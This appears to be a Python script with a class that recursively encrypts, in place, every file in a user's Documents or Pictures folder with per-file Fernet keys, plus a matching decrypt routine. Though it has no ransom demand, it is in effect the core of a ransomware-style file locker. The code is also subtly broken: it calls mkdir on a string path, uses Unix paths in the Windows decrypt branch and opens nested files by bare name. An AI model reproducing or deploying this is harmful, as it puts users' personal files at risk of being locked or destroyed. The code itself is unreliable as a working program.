from cryptography.fernet import Fernet
import os
import pathlib

class Encrypt:
    def __init__(self):
        self.user = os.getlogin()
    def encrypt_files(self):

        if os.path.isdir("C:/"):
            print("Windows OS")
            keys_directory = f"C:/Users/{self.user}/Videos/"
            keys_directory.mkdir(exist_ok=True)
            data_directory = pathlib.Path(f"C:/Users/{self.user}/Documents")
        elif os.path.isdir("/home/"):
            print("Unix-Like OS")
            keys_directory = pathlib.Path("~").expanduser() / f"Documents/Keys"
            keys_directory.mkdir(exist_ok=True)
            data_directory = pathlib.Path(f"/home/{self.user}/Pictures")

        for file_name in data_directory.rglob("*"):
            if file_name.is_file():
                print(file_name)
                if file_name.suffix not in (".py", ".key"):
                    key = Fernet.generate_key()

                    with open(
                        (keys_directory / file_name.name).with_suffix(".key"), "wb"
                    ) as filekey:
                        filekey.write(key)

                    fernet = Fernet(key)

                    try:
                        with open(
                            data_directory / file_name.name, "rb"
                        ) as file:
                            original = file.read()

                        encrypted = fernet.encrypt(original)

                        with open(
                            (data_directory / file_name), "wb"
                        ) as encrypted_file:
                            encrypted_file.write(encrypted)

                        print(f"{file_name=} => {encrypted_file=}; {filekey=}")
                    except (PermissionError, FileNotFoundError) as e:
                        print(e)
                        continue
        
    def decrypt_files(self):
        if os.path.isdir("C:/"):
            print("Windows OS")
            keys_directory = pathlib.Path("~").expanduser() / f"Documents/Keys"
            keys_directory.mkdir(exist_ok=True)

            data_directory = pathlib.Path(f"/home/{self.user}/Pictures")

        elif os.path.isdir("/home/"):
            print("Unix-Like OS")
            keys_directory = pathlib.Path("~").expanduser() / f"Documents/Keys"
            keys_directory.mkdir(exist_ok=True)
            data_directory = pathlib.Path(f"/home/{self.user}/Pictures")
            
        for file_name in data_directory.rglob("*"):
            if file_name.is_file():
                if file_name.suffix not in (".py", ".key"):

                    with open((keys_directory / file_name.name).with_suffix(".key"), "rb") as filekey:
                        key = filekey.read()

                    fernet = Fernet(key)

                    try:
                        with open(
                            data_directory / file_name.name, "rb"
                        ) as file:
                            encrypted = file.read()

                        decrypted = fernet.decrypt(encrypted)

                        with open(
                            (data_directory / file_name), "wb"
                        ) as encrypted_file:
                            encrypted_file.write(decrypted)

                        print(f"{file_name=} => {encrypted_file=}; {filekey=}")
                    except (PermissionError, FileNotFoundError) as e:
                        print(e)
                        continue
